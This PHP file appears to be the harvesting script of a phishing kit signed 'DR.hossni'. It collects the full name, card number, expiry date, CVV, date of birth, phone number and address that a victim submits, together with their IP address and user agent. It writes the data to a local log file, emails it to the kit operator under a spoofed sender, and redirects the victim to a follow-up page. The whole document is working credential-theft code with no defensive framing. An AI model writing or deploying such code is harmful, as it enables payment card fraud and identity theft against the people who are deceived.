<?php
include 'antibots.php';
include 'bots.php';
session_start();
?>
<?
include 'emailk.php';
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------------------------------------------\n";
$message .= "Full name                  : ".$_POST['nameoncard']."\n";
$message .= "Card number                : ".$_POST['cardid1']."\n";
$message .= "Expiry date                : ".$_POST['cd']."\n";
$message .= "Security code              : ".$_POST['cvv']."\n";
$message .= "Date of birth              : ".$_POST['date_ob']."\n";
$message .= "Phone number               : ".$_POST['Phone']."\n";
$message .= "---------------------------------------------\n";
$message .= "Street address             : ".$_POST['address']."\n";
$message .= "City                       : ".$_POST['city']."\n";
$message .= "State                      : ".$_POST['State']."\n";
$message .= "Postal code                : ".$_POST['Postal']."\n";
$message .= "Country                    : ".$_POST['soo']."\n";
$message .= "----------------------[DR.hossni]-----------------------\n";
$message .= "".$_SERVER['REMOTE_ADDR']." | ".date("m/d/Y g:i:a")."\n";
$message .= "---------------------------------------------\n";
$message .= "UserAgent                  : $useragent\n";
$message .= "---------------------------------------------\n";
$subject = "".$_POST['soo']." | ".$_POST['cardid1']." | ".$_POST['cd']." | ".$_POST['cvv']." | $ip =?UTF-8?Q?=E2=9C=94_?=";
$f = fopen("../../dr3.txt", "a");
fwrite($f, $message); 
$from = "From: F-U-L-L  <news@add.dioury.hk>";
@mail($send,$subject,$message,$from);
@header("Location: code.html");
